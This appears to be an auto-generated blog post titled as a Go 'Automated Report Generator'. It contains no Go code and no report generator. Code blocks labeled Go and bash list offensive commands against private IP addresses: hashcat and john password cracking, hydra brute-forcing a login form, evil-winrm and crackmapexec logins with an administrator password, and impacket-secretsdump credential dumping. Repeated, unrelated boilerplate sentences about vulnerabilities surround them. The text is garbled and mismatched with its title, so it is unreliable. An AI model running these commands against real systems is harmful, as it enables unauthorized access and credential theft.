---
TitleSEO: "Automated Report Generator in Go | ZureFX"
TitlePost: "Automated Report Generator — Go"
Author: "ZureFX"
Description: "A Go script for automated report generator. Built for security research and automation."
Keywords: "powershell, automation, fuzzer, script, c, scanner, go"
URL: "https://zurefx.github.io/scripting/script-automated-report-generator-796.html"
URL_IMAGES: ""
Date: "2025-01-14"
Tags: "PowerShell, Automation, Fuzzer, Script, C, Scanner, Go"
Section: "scripting"
Lang: "en"
main_img: "script-automated-report-generator-796"
Permalink: "/scripting/script-automated-report-generator-796.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. Unconstrained delegation was enabled on the compromised machine.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `netcat`
- `gobuster`
- `GetUserSPNs`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.41.153.72 -u administrator -p 'P@ssw0rd!'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```go
crackmapexec smb 10.32.44.102 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.128.44.46 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.77.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p110,9200,995 10.127.146.59 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.121.154.152 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.128.179.92/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.187.121
feroxbuster -h
gobuster dir -u http://10.88.20.57/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.123.100.52 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 13.89s
```
